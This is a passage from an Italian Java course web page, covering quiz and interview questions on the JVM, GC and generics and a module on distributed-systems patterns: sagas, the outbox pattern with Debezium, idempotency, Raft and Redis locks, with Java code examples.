                            <span>La tua classe sostituisce quella del JDK grazie al classpath priority</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q76" value="b">
                            <span>La classe del JDK viene sempre usata grazie al parent-first delegation del ClassLoader</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q76" value="c">
                            <span>Errore di compilazione: non puoi definire classi nel package java.*</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q76" value="d">
                            <span>Dipende dall'ordine nel classpath: la prima trovata vince</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q76')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q76"></div>
                </div>

                <div class="quiz-question" data-correct="c">
                    <h4><span>Q77.</span> Un oggetto con una reference da un ThreadLocal di un thread in un thread pool è GC-eligible quando?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q77" value="a">
                            <span>Quando il metodo che ha settato il ThreadLocal termina</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q77" value="b">
                            <span>Quando il thread torna al pool (non è più "in uso")</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q77" value="c">
                            <span>Mai, finché il thread esiste - è un memory leak comune</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q77" value="d">
                            <span>Immediatamente dopo la creazione del ThreadLocal</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q77')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q77"></div>
                </div>

                <div class="quiz-question" data-correct="a">
                    <h4><span>Q78.</span> Perché ZGC può avere pause &lt; 1ms anche con heap di terabyte?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q78" value="a">
                            <span>Usa colored pointers e load barriers per fare quasi tutto il lavoro concurrently con l'applicazione</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q78" value="b">
                            <span>Divide l'heap in regioni più piccole e fa GC incrementale</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q78" value="c">
                            <span>Usa più thread per il GC parallelo</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q78" value="d">
                            <span>Non fa mai full GC, solo minor GC sulla young generation</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q78')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q78"></div>
                </div>

                <div class="quiz-question" data-correct="d">
                    <h4><span>Q79.</span> Qual è il problema con questo codice? <code>public &lt;T&gt; void add(List&lt;? extends T&gt; list, T element) { list.add(element); }</code></h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q79" value="a">
                            <span>Nessun problema, il codice compila ed è corretto</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q79" value="b">
                            <span>T non è definito correttamente</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q79" value="c">
                            <span>extends dovrebbe essere super per il tipo di ritorno</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q79" value="d">
                            <span>Non puoi aggiungere elementi a List&lt;? extends T&gt; perché è un producer (PECS)</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q79')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q79"></div>
                </div>

                <div class="quiz-question" data-correct="b">
                    <h4><span>Q80.</span> Quale vantaggio principale offrono le Sealed Classes per il pattern matching?</h4>
                    <div class="quiz-options">
                        <label class="quiz-option" data-value="a">
                            <input type="radio" name="q80" value="a">
                            <span>Performance migliore nel confronto dei tipi</span>
                        </label>
                        <label class="quiz-option" data-value="b">
                            <input type="radio" name="q80" value="b">
                            <span>Il compilatore può verificare l'exhaustiveness dello switch senza default</span>
                        </label>
                        <label class="quiz-option" data-value="c">
                            <input type="radio" name="q80" value="c">
                            <span>Permette di usare record nei pattern</span>
                        </label>
                        <label class="quiz-option" data-value="d">
                            <input type="radio" name="q80" value="d">
                            <span>Abilita il destructuring automatico delle classi</span>
                        </label>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q80')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q80"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 16 -->
            <section class="section" id="modulo16-questions">
                <h2>Domande da Colloquio - Modulo 16</h2>

                <div class="info-box">
                    <h4>Q: Spiega il ciclo di vita del class loading in Java.</h4>
                    <p><strong>Risposta attesa:</strong> Tre fasi: <strong>Loading</strong> (lettura bytecode dal .class file), <strong>Linking</strong> (verification del bytecode, preparation con allocazione memoria per static, resolution dei riferimenti simbolici), <strong>Initialization</strong> (esecuzione del blocco static e &lt;clinit&gt;). Il loading è lazy: una classe viene caricata solo quando necessario. La gerarchia di ClassLoader segue il principio parent-first per sicurezza.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando sceglieresti G1 GC vs ZGC?</h4>
                    <p><strong>Risposta attesa:</strong> <strong>G1</strong>: default da Java 9, buon bilanciamento throughput/latency, target pause configurabile (~200ms tipico), maturo e ben testato. Sceglilo per la maggior parte delle applicazioni. <strong>ZGC</strong>: quando hai requisiti stringenti di latency (&lt;10ms pause), heap molto grandi (decine-centinaia GB), o applicazioni interattive/real-time. Trade-off: ZGC usa più CPU per il lavoro concorrente e può avere throughput leggermente inferiore.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Cosa significa type erasure e quali limitazioni comporta?</h4>
                    <p><strong>Risposta attesa:</strong> I tipi generici esistono solo a compile-time. A runtime, List&lt;String&gt; e List&lt;Integer&gt; sono entrambi solo List (raw type). Limitazioni: non puoi fare instanceof con generics (es: x instanceof List&lt;String&gt;), non puoi creare array di tipi generici (new T[10]), non puoi ottenere T.class direttamente. Workaround: passare Class&lt;T&gt; come parametro esplicito (type token pattern).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega PECS con un esempio pratico.</h4>
                    <p><strong>Risposta attesa:</strong> Producer Extends, Consumer Super. Se LEGGI dalla collezione (produce elementi per te), usa extends: <code>List&lt;? extends Number&gt;</code> accetta List&lt;Integer&gt; o List&lt;Double&gt;. Se SCRIVI nella collezione (consuma i tuoi elementi), usa super: <code>List&lt;? super Integer&gt;</code> accetta List&lt;Integer&gt;, List&lt;Number&gt;, List&lt;Object&gt;. Esempio: Collections.copy(dest, src) usa super per dest (ci scrivi) e extends per src (ci leggi).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come diagnostichi un memory leak in produzione?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Monitoring: osserva heap usage nel tempo (trend crescente?), frequenza GC, tempo speso in GC. 2) Heap dump: jmap -dump o trigger automatico con -XX:+HeapDumpOnOutOfMemoryError. 3) Analisi con Eclipse MAT: cerca dominator tree (chi tiene più memoria), leak suspects, histogram delle classi. Cause comuni: collection statiche che crescono, listener non deregistrati, ThreadLocal senza remove(), cache senza eviction.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Qual è il vantaggio dei Record rispetto a una classe normale o Lombok?</h4>
                    <p><strong>Risposta attesa:</strong> Record: supporto nativo del linguaggio, semantica chiara (dati immutabili), integrazione con pattern matching (destructuring), no dependency esterna, equals/hashCode/toString garantiti corretti. Vs Lombok: no annotation processor, no problemi IDE, compilazione più prevedibile. Limiti: non possono estendere classi (solo implementare interfacce), tutti i campi sono final, non puoi aggiungere campi instance. Usa Record per DTO, value objects, risultati di query.</p>
                </div>
            </section>

            <!-- Links Modulo 16 -->
            <section class="section" id="modulo16-links">
                <h2>Link di Approfondimento - Modulo 16</h2>

                <div class="info-box">
                    <h4>JVM Architecture & Class Loading</h4>
                    <p><a href="https://docs.oracle.com/javase/specs/jvms/se21/html/index.html" target="_blank">JVM Specification (Oracle)</a> - Specifica ufficiale della JVM</p>
                    <p><a href="https://www.baeldung.com/java-classloaders" target="_blank">Baeldung: Class Loaders in Java</a> - Guida pratica ai ClassLoader</p>
                    <p><a href="https://blogs.oracle.com/javamagazine/post/how-the-jvm-locates-loads-and-runs-libraries" target="_blank">Oracle Java Magazine: How the JVM Loads Classes</a></p>
                </div>

                <div class="info-box">
                    <h4>Garbage Collection</h4>
                    <p><a href="https://docs.oracle.com/en/java/javase/21/gctuning/introduction-garbage-collection-tuning.html" target="_blank">Oracle GC Tuning Guide</a> - Guida ufficiale al tuning del GC</p>
                    <p><a href="https://www.oracle.com/technical-resources/articles/java/g1gc.html" target="_blank">Getting Started with G1 GC</a> - Introduzione a G1</p>
                    <p><a href="https://malloc.se/blog/zgc-jdk21" target="_blank">ZGC in JDK 21</a> - Approfondimento su ZGC</p>
                    <p><a href="https://www.baeldung.com/jvm-garbage-collectors" target="_blank">Baeldung: JVM Garbage Collectors</a> - Confronto tra GC</p>
                    <p><a href="https://eclipse.dev/mat/" target="_blank">Eclipse Memory Analyzer (MAT)</a> - Tool per analisi heap dump</p>
                </div>

                <div class="info-box">
                    <h4>JIT Compilation</h4>
                    <p><a href="https://www.baeldung.com/graal-java-jit-compiler" target="_blank">Baeldung: GraalVM JIT Compiler</a></p>
                    <p><a href="https://www.ibm.com/docs/en/sdk-java-technology/8?topic=compiler-how-jit-optimizes-code" target="_blank">IBM: How the JIT Optimizes Code</a></p>
                </div>

                <div class="info-box">
                    <h4>Generics</h4>
                    <p><a href="https://docs.oracle.com/javase/tutorial/java/generics/index.html" target="_blank">Oracle Generics Tutorial</a> - Tutorial ufficiale</p>
                    <p><a href="https://www.baeldung.com/java-generics" target="_blank">Baeldung: The Basics of Java Generics</a></p>
                    <p><a href="https://stackoverflow.com/questions/2723397/what-is-pecs-producer-extends-consumer-super" target="_blank">Stack Overflow: PECS Explained</a></p>
                </div>

                <div class="info-box">
                    <h4>Java Modern Features (17+)</h4>
                    <p><a href="https://openjdk.org/jeps/395" target="_blank">JEP 395: Records</a> - Specifica ufficiale dei Record</p>
                    <p><a href="https://openjdk.org/jeps/409" target="_blank">JEP 409: Sealed Classes</a> - Specifica delle Sealed Classes</p>
                    <p><a href="https://openjdk.org/jeps/441" target="_blank">JEP 441: Pattern Matching for switch</a></p>
                    <p><a href="https://www.baeldung.com/java-record-keyword" target="_blank">Baeldung: Java Record Keyword</a></p>
                    <p><a href="https://inside.java/" target="_blank">Inside.java</a> - Blog ufficiale del team Java</p>
                </div>
            </section>

            <!-- ==================== MODULO 17: DISTRIBUTED SYSTEMS AVANZATI ==================== -->
            <header class="module-header" id="modulo17">
                <span class="module-tag">Modulo 17</span>
                <h1>Distributed Systems Avanzati</h1>
                <p>Pattern avanzati per gestire transazioni distribuite, consistenza e coordinazione in architetture a microservizi.</p>
            </header>

            <!-- Saga Pattern -->
            <section class="section" id="modulo17-saga">
                <h2>Saga Pattern</h2>

                <p>In sistemi distribuiti, le transazioni ACID tradizionali non funzionano attraverso servizi. Il <strong>Saga Pattern</strong> gestisce transazioni distribuite come sequenza di transazioni locali con <strong>compensating transactions</strong> per il rollback.</p>

                <h3>Orchestration vs Choreography</h3>

                <div class="diagram"><pre>
ORCHESTRATION (Comando centralizzato)
══════════════════════════════════════════════════════════════
                    ┌─────────────────┐
                    │  Saga           │
                    │  Orchestrator   │
                    └───────┬─────────┘
           ┌────────────────┼────────────────┐
           ▼                ▼                ▼
    ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
    │   Order      │ │   Payment    │ │   Inventory  │
    │   Service    │ │   Service    │ │   Service    │
    └──────────────┘ └──────────────┘ └──────────────┘

    ✅ Pro: Flusso chiaro, facile debugging, controllo centralizzato
    ❌ Contro: Single point of failure, orchestrator può diventare bottleneck


CHOREOGRAPHY (Eventi distribuiti)
══════════════════════════════════════════════════════════════
    ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
    │   Order      │────▶│   Payment    │────▶│   Inventory  │
    │   Service    │     │   Service    │     │   Service    │
    └──────────────┘     └──────────────┘     └──────────────┘
          │                    │                    │
          ▼                    ▼                    ▼
    ┌─────────────────────────────────────────────────────────┐
    │                    Event Bus (Kafka)                     │
    │  OrderCreated → PaymentProcessed → InventoryReserved    │
    └─────────────────────────────────────────────────────────┘

    ✅ Pro: Decoupling, no single point of failure, scalabile
    ❌ Contro: Flusso difficile da seguire, debugging complesso
</pre></div>

                <h3>Compensating Transactions</h3>

<pre><code class="language-java">// Esempio: Saga per prenotazione viaggio
// Forward flow: Hotel → Volo → Auto
// Compensating: CancelAuto → CancelVolo → CancelHotel (reverse order!)

public class TripBookingSaga {

    // Step 1: Book Hotel
    public void bookHotel(TripRequest request) {
        try {
            hotelService.reserve(request.hotelId());
            // Pubblica evento per next step
            eventBus.publish(new HotelBookedEvent(request));
        } catch (Exception e) {
            // Nessuna compensazione necessaria (primo step)
            eventBus.publish(new TripBookingFailedEvent(request, "Hotel"));
        }
    }

    // Step 2: Book Flight (triggered by HotelBookedEvent)
    @EventListener
    public void onHotelBooked(HotelBookedEvent event) {
        try {
            flightService.reserve(event.flightId());
            eventBus.publish(new FlightBookedEvent(event.request()));
        } catch (Exception e) {
            // COMPENSATE: Cancel hotel
            compensateHotel(event.request());
            eventBus.publish(new TripBookingFailedEvent(event.request(), "Flight"));
        }
    }

    // Step 3: Book Car (triggered by FlightBookedEvent)
    @EventListener
    public void onFlightBooked(FlightBookedEvent event) {
        try {
            carService.reserve(event.carId());
            eventBus.publish(new TripBookingCompletedEvent(event.request()));
        } catch (Exception e) {
            // COMPENSATE: Cancel flight AND hotel (reverse order)
            compensateFlight(event.request());
            compensateHotel(event.request());
            eventBus.publish(new TripBookingFailedEvent(event.request(), "Car"));
        }
    }

    // Compensating transactions
    private void compensateHotel(TripRequest req) {
        hotelService.cancelReservation(req.hotelId());
    }

    private void compensateFlight(TripRequest req) {
        flightService.cancelReservation(req.flightId());
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Sfide delle Compensating Transactions</h4>
                    <p><strong>Non sempre reversibili:</strong> Un'email inviata non può essere "de-inviata". Alcune azioni richiedono compensazioni semanticamente diverse (es: inviare email di scuse).</p>
                    <p><strong>Idempotenza:</strong> Le compensazioni potrebbero essere eseguite più volte (retry). Devono essere idempotenti!</p>
                    <p><strong>Ordine:</strong> Compensazioni vanno eseguite in ordine inverso per mantenere consistenza.</p>
                </div>

                <h3>Implementazione con Kafka</h3>

<pre><code class="language-java">// Saga State Machine con Kafka
public class OrderSagaStateMachine {

    private final KafkaTemplate&lt;String, SagaEvent&gt; kafka;
    private final SagaStateRepository stateRepo;

    public void startSaga(OrderRequest order) {
        SagaState state = new SagaState(order.id(), SagaStatus.STARTED);
        stateRepo.save(state);

        kafka.send("payment-commands",
            new ProcessPaymentCommand(order.id(), order.amount()));
    }

    @KafkaListener(topics = "payment-events")
    public void onPaymentEvent(PaymentEvent event) {
        SagaState state = stateRepo.findById(event.orderId());

        if (event instanceof PaymentSucceeded) {
            state.setStatus(SagaStatus.PAYMENT_COMPLETED);
            stateRepo.save(state);
            // Next step
            kafka.send("inventory-commands",
                new ReserveInventoryCommand(event.orderId()));

        } else if (event instanceof PaymentFailed) {
            state.setStatus(SagaStatus.FAILED);
            stateRepo.save(state);
            // No compensation needed (first step)
        }
    }

    @KafkaListener(topics = "inventory-events")
    public void onInventoryEvent(InventoryEvent event) {
        SagaState state = stateRepo.findById(event.orderId());

        if (event instanceof InventoryReserved) {
            state.setStatus(SagaStatus.COMPLETED);
            stateRepo.save(state);
            kafka.send("order-events", new OrderCompletedEvent(event.orderId()));

        } else if (event instanceof InventoryFailed) {
            state.setStatus(SagaStatus.COMPENSATING);
            stateRepo.save(state);
            // COMPENSATE: Refund payment
            kafka.send("payment-commands",
                new RefundPaymentCommand(event.orderId()));
        }
    }
}</code></pre>
            </section>

            <!-- Distributed Transactions -->
            <section class="section" id="modulo17-transactions">
                <h2>Distributed Transactions</h2>

                <h3>Two-Phase Commit (2PC)</h3>
                <p>Protocollo classico per transazioni distribuite, ma con problemi significativi:</p>

                <div class="diagram"><pre>
TWO-PHASE COMMIT (2PC)
══════════════════════════════════════════════════════════════

PHASE 1: PREPARE (voting)
──────────────────────────
         Coordinator
              │
    ┌─────────┼─────────┐
    ▼         ▼         ▼
  ┌───┐     ┌───┐     ┌───┐
  │ A │     │ B │     │ C │    "Can you commit?"
  └─┬─┘     └─┬─┘     └─┬─┘
    │ YES     │ YES     │ YES
    └─────────┴─────────┘
              │
         Coordinator
         (tutti YES?)

PHASE 2: COMMIT (decision)
──────────────────────────
         Coordinator
              │ COMMIT (o ROLLBACK se qualcuno ha detto NO)
    ┌─────────┼─────────┐
    ▼         ▼         ▼
  ┌───┐     ┌───┐     ┌───┐
  │ A │     │ B │     │ C │    Commit!
  └───┘     └───┘     └───┘


PROBLEMI DI 2PC:
═══════════════════════════════════════════════════════════════
1. BLOCKING: Se coordinator crasha dopo PREPARE, i partecipanti
   restano bloccati (hanno lock sulle risorse, non sanno se
   commit o abort)

2. SINGLE POINT OF FAILURE: Coordinator è critico

3. LATENCY: Due round-trip network + lock sulle risorse
   durante tutta la transazione

4. NOT PARTITION TOLERANT: Se network partition durante Phase 2,
   alcuni nodi potrebbero committare e altri no → inconsistenza!
</pre></div>

                <h3>Outbox Pattern</h3>
                <p>Garantisce <strong>at-least-once delivery</strong> di eventi senza 2PC:</p>

<pre><code class="language-java">// Il problema: due operazioni che devono essere atomiche
@Transactional
public void createOrder(Order order) {
    orderRepository.save(order);           // DB write
    kafkaTemplate.send("orders", order);   // Kafka publish
    // ⚠️ Se il servizio crasha dopo save() ma prima di send(),
    // l'ordine esiste nel DB ma l'evento non è mai pubblicato!
}

// Soluzione: OUTBOX PATTERN
@Transactional  // Una singola transazione DB atomica
public void createOrderWithOutbox(Order order) {
    orderRepository.save(order);

    // Salva l'evento nella stessa transazione
    OutboxEvent event = new OutboxEvent(
        UUID.randomUUID(),
        "OrderCreated",
        objectMapper.writeValueAsString(order),
        Instant.now()
    );
    outboxRepository.save(event);  // Stessa transazione!
}

// Un processo separato (CDC o polling) legge l'outbox e pubblica
@Scheduled(fixedDelay = 1000)
public void publishOutboxEvents() {
    List&lt;OutboxEvent&gt; events = outboxRepository.findUnpublished();
    for (OutboxEvent event : events) {
        try {
            kafkaTemplate.send("orders", event.getPayload()).get();
            event.setPublished(true);
            outboxRepository.save(event);
        } catch (Exception e) {
            // Retry al prossimo ciclo
            log.warn("Failed to publish event {}", event.getId());
        }
    }
}</code></pre>

                <div class="diagram"><pre>
OUTBOX PATTERN - Flow
══════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────┐
│                    Order Service                         │
│                                                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │           Single DB Transaction                   │   │
│  │  ┌─────────────┐      ┌────────────────────┐     │   │
│  │  │   orders    │      │   outbox_events    │     │   │
│  │  │   table     │      │   table            │     │   │
│  │  │             │      │                    │     │   │
│  │  │ id: 123     │      │ id: abc-123        │     │   │
│  │  │ status: NEW │      │ type: OrderCreated │     │   │
│  │  │ amount: 99  │      │ payload: {...}     │     │   │
│  │  │             │      │ published: false   │     │   │
│  │  └─────────────┘      └────────────────────┘     │   │
│  └──────────────────────────────────────────────────┘   │
│                            │                             │
└────────────────────────────┼─────────────────────────────┘
                             │
                    ┌────────▼────────┐
                    │ Outbox Poller / │
                    │ CDC (Debezium)  │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │     Kafka       │
                    │  orders topic   │
                    └─────────────────┘
</pre></div>

                <h3>Change Data Capture (CDC) con Debezium</h3>
                <p>Alternativa più elegante al polling: cattura le modifiche direttamente dal DB log.</p>

<pre><code class="language-json">// Configurazione Debezium connector per PostgreSQL
{
  "name": "order-outbox-connector",
  "config": {
    "connector.class": "io.debezium.connector.postgresql.PostgresConnector",
    "database.hostname": "postgres",
    "database.port": "5432",
    "database.user": "debezium",
    "database.password": "secret",
    "database.dbname": "orders",
    "table.include.list": "public.outbox_events",
    "transforms": "outbox",
    "transforms.outbox.type":
      "io.debezium.transforms.outbox.EventRouter",
    "transforms.outbox.route.topic.replacement": "${routedByValue}",
    "transforms.outbox.table.field.event.key": "aggregate_id",
    "transforms.outbox.table.field.event.type": "event_type",
    "transforms.outbox.table.field.event.payload": "payload"
  }
}</code></pre>

                <div class="info-box success">
                    <h4>Vantaggi di CDC vs Polling</h4>
                    <p><strong>Latenza:</strong> CDC legge dal WAL/binlog quasi in real-time. Polling ha latenza del cron interval.</p>
                    <p><strong>Carico DB:</strong> CDC legge dal log (già scritto). Polling fa query ripetute.</p>
                    <p><strong>Ordine:</strong> CDC garantisce ordine esatto delle transazioni. Polling potrebbe invertire l'ordine.</p>
                </div>
            </section>

            <!-- Idempotency Patterns -->
            <section class="section" id="modulo17-idempotency">
                <h2>Idempotency Patterns</h2>

                <p>In sistemi distribuiti con retry automatici, le operazioni devono essere <strong>idempotenti</strong>: eseguirle più volte produce lo stesso risultato di una singola esecuzione.</p>

                <h3>Idempotency Key Pattern</h3>

<pre><code class="language-java">// Client invia un idempotency key univoco
@PostMapping("/payments")
public ResponseEntity&lt;Payment&gt; createPayment(
        @RequestHeader("Idempotency-Key") String idempotencyKey,
        @RequestBody PaymentRequest request) {

    // 1. Controlla se già processato
    Optional&lt;PaymentResult&gt; existing =
        idempotencyStore.get(idempotencyKey);

    if (existing.isPresent()) {
        // Ritorna lo stesso risultato (idempotente!)
        return ResponseEntity.ok(existing.get().getPayment());
    }

    // 2. Processa il pagamento
    Payment payment = paymentService.process(request);

    // 3. Salva il risultato per future richieste duplicate
    idempotencyStore.save(idempotencyKey,
        new PaymentResult(payment, Instant.now()));

    return ResponseEntity.status(HttpStatus.CREATED).body(payment);
}

// Idempotency store con TTL (le chiavi scadono dopo un po')
@Component
public class RedisIdempotencyStore {
    private final RedisTemplate&lt;String, PaymentResult&gt; redis;
    private final Duration ttl = Duration.ofHours(24);

    public void save(String key, PaymentResult result) {
        redis.opsForValue().set(key, result, ttl);
    }

    public Optional&lt;PaymentResult&gt; get(String key) {
        return Optional.ofNullable(redis.opsForValue().get(key));
    }
}</code></pre>

                <h3>Deduplication con Message ID</h3>

<pre><code class="language-java">// Kafka consumer con deduplication
@KafkaListener(topics = "orders")
public void processOrder(ConsumerRecord&lt;String, OrderEvent&gt; record) {
    String messageId = record.headers()
        .lastHeader("message-id")
        .value()
        .toString();

    // Usa Redis SET NX (set if not exists) per deduplication
    Boolean isNew = redis.opsForValue()
        .setIfAbsent("processed:" + messageId, "1", Duration.ofDays(7));

    if (Boolean.FALSE.equals(isNew)) {
        log.info("Duplicate message {}, skipping", messageId);
        return;
    }

    // Processa solo se nuovo
    orderService.process(record.value());
}

// Alternativa: deduplication table nel DB
@Transactional
public void processOrderWithDbDedup(String messageId, OrderEvent event) {
    try {
        // Unique constraint su message_id
        processedMessagesRepo.save(new ProcessedMessage(messageId));
        orderService.process(event);
    } catch (DataIntegrityViolationException e) {
        // Constraint violation = messaggio già processato
        log.info("Duplicate message {}, skipping", messageId);
    }
}</code></pre>

                <h3>At-Least-Once vs Exactly-Once vs At-Most-Once</h3>

                <div class="diagram"><pre>
DELIVERY SEMANTICS
══════════════════════════════════════════════════════════════

AT-MOST-ONCE (fire and forget)
──────────────────────────────
Producer ──▶ Broker          Consumer processa 0 o 1 volta
    │
    └── non aspetta ACK      ⚠️ Può PERDERE messaggi
                             ✅ Massimo throughput

AT-LEAST-ONCE (con retry)
─────────────────────────
Producer ──▶ Broker ──▶ Consumer
    │            │          │
    │            │          └── ACK dopo processing
    │            │
    └── retry se no ACK     ⚠️ Può avere DUPLICATI
                            ✅ Nessun messaggio perso

EXACTLY-ONCE (idempotente)
──────────────────────────
Producer ──▶ Broker ──▶ Consumer
    │                       │
    │                       └── Deduplication +
    │                           Idempotent processing
    │
    └── Producer ID +       ✅ Ogni messaggio processato
        Sequence Number         ESATTAMENTE una volta
                            ⚠️ Overhead maggiore
</pre></div>

                <div class="info-box">
                    <h4>Exactly-Once in Kafka</h4>
                    <p>Kafka supporta exactly-once semantics con:</p>
                    <p><code>enable.idempotence=true</code> - Producer idempotente (dedup basata su producer ID + sequence)</p>
                    <p><code>transactional.id=xxx</code> - Transazioni Kafka (atomic write to multiple partitions)</p>
                    <p><code>isolation.level=read_committed</code> - Consumer legge solo messaggi committed</p>
                </div>
            </section>

            <!-- Consensus & Raft -->
            <section class="section" id="modulo17-consensus">
                <h2>Consensus: Raft</h2>

                <p>I sistemi distribuiti hanno bisogno di <strong>consensus</strong> per accordarsi su un valore quando i nodi possono fallire. <strong>Raft</strong> è un algoritmo di consensus progettato per essere comprensibile.</p>

                <h3>Perché serve Consensus?</h3>

                <div class="diagram"><pre>
PROBLEMA: SPLIT-BRAIN
══════════════════════════════════════════════════════════════

                    Network Partition!
                          ║
        Datacenter A      ║      Datacenter B
        ┌──────────┐      ║      ┌──────────┐
        │ Node 1   │      ║      │ Node 3   │
        │ (leader?)│      ║      │ (leader?)│
        └──────────┘      ║      └──────────┘
        ┌──────────┐      ║      ┌──────────┐
        │ Node 2   │      ║      │ Node 4   │
        └──────────┘      ║      └──────────┘
                          ║
    Client A scrive       ║      Client B scrive
    "x = 1" via Node 1    ║      "x = 2" via Node 3

    ⚠️ Due "leader" accettano write diverse!
       Quando la partition si risolve: qual è il valore corretto?

SOLUZIONE: CONSENSUS con QUORUM
═══════════════════════════════════════════════════════════════

5 nodi totali → quorum = 3 (maggioranza)

        Datacenter A           Datacenter B
        ┌──────────┐           ┌──────────┐
        │ Node 1   │           │ Node 3   │
        │ (leader) │           │          │
        └──────────┘           └──────────┘
        ┌──────────┐           ┌──────────┐
        │ Node 2   │           │ Node 4   │
        └──────────┘           └──────────┘
        ┌──────────┐
        │ Node 5   │
        └──────────┘

    Datacenter A ha 3 nodi = QUORUM → può eleggere leader
    Datacenter B ha 2 nodi = no quorum → READ-ONLY, no leader
</pre></div>

                <h3>Raft: Leader Election</h3>

<pre><code class="language-java">// Raft node states
enum NodeState { FOLLOWER, CANDIDATE, LEADER }

// Simplified Raft leader election
class RaftNode {
    private NodeState state = FOLLOWER;
    private int currentTerm = 0;
    private String votedFor = null;
    private String leaderId = null;

    // Followers: reset timer on heartbeat from leader
    // If timer expires → become candidate
    void onElectionTimeout() {
        state = CANDIDATE;
        currentTerm++;
        votedFor = selfId;  // Vote for self

        // Request votes from all other nodes
        int votes = 1;  // Self vote
        for (RaftNode peer : peers) {
            VoteResponse resp = peer.requestVote(currentTerm, selfId);
            if (resp.voteGranted()) votes++;
        }

        // Need majority to become leader
        if (votes > (peers.size() + 1) / 2) {
            state = LEADER;
            startHeartbeats();
        } else {
            state = FOLLOWER;  // Election failed, wait for next timeout
        }
    }

    // Handle vote request
    VoteResponse requestVote(int term, String candidateId) {
        if (term > currentTerm) {
            currentTerm = term;
            votedFor = null;  // New term, can vote again
        }

        boolean grantVote = (term >= currentTerm)
            && (votedFor == null || votedFor.equals(candidateId));

        if (grantVote) votedFor = candidateId;
        return new VoteResponse(currentTerm, grantVote);
    }
}</code></pre>

                <h3>Raft: Log Replication</h3>

                <div class="diagram"><pre>
LOG REPLICATION
══════════════════════════════════════════════════════════════

Client: "SET x=5"
        │
        ▼
    ┌─────────┐
    │ LEADER  │  1. Append to local log (uncommitted)
    │ Log:    │  2. Send AppendEntries to followers
    │ [x=5]   │  3. Wait for majority ACK
    └────┬────┘  4. Commit + apply to state machine
         │       5. Respond to client
    ┌────┼────┐
    ▼    ▼    ▼
┌─────┐┌─────┐┌─────┐
│ F1  ││ F2  ││ F3  │  Followers: append, ACK, wait for commit
│[x=5]││[x=5]││[x=5]│
└─────┘└─────┘└─────┘

Log entry format:
┌───────┬──────┬─────────┐
│ Index │ Term │ Command │
├───────┼──────┼─────────┤
│   1   │  1   │ SET x=3 │
│   2   │  1   │ SET y=7 │
│   3   │  2   │ SET x=5 │  ← Current
└───────┴──────┴─────────┘

SAFETY: Un entry è COMMITTED solo quando replicato sulla
        MAGGIORANZA dei nodi. I committed entries non possono
        essere persi anche se il leader crasha.
</pre></div>

                <div class="info-box success">
                    <h4>Implementazioni di Raft</h4>
                    <p><strong>etcd:</strong> Key-value store usato da Kubernetes per lo state del cluster</p>
                    <p><strong>Consul:</strong> Service discovery e configuration</p>
                    <p><strong>CockroachDB:</strong> Distributed SQL database</p>
                    <p><strong>TiKV:</strong> Distributed key-value (usato da TiDB)</p>
                </div>
            </section>

            <!-- Distributed Locking -->
            <section class="section" id="modulo17-locking">
                <h2>Distributed Locking</h2>

                <p>In sistemi distribuiti, a volte serve garantire che solo un processo alla volta esegua un'operazione critica (es: job scheduling, leader election, rate limiting).</p>

                <h3>Redis Distributed Lock (Simple)</h3>

<pre><code class="language-java">// Lock semplice con SETNX + TTL
public class RedisLock {
    private final RedisTemplate&lt;String, String&gt; redis;

    public boolean tryLock(String lockKey, String ownerId, Duration ttl) {
        // SET key value NX PX milliseconds
        // NX = only if not exists, PX = expire in milliseconds
        Boolean acquired = redis.opsForValue()
            .setIfAbsent(lockKey, ownerId, ttl);
        return Boolean.TRUE.equals(acquired);
    }

    public void unlock(String lockKey, String ownerId) {
        // IMPORTANTE: Rilascia SOLO se siamo noi il proprietario!
        // Altrimenti potremmo rilasciare il lock di qualcun altro
        String script = """
            if redis.call('get', KEYS[1]) == ARGV[1] then
                return redis.call('del', KEYS[1])
            else
                return 0
            end
            """;
        redis.execute(new DefaultRedisScript&lt;&gt;(script, Long.class),
            List.of(lockKey), ownerId);
    }
}

// Uso
String lockKey = "job:daily-report";
String ownerId = UUID.randomUUID().toString();
Duration ttl = Duration.ofMinutes(5);

if (lock.tryLock(lockKey, ownerId, ttl)) {
    try {
        // Esegui operazione critica
        runDailyReport();
    } finally {
        lock.unlock(lockKey, ownerId);
    }
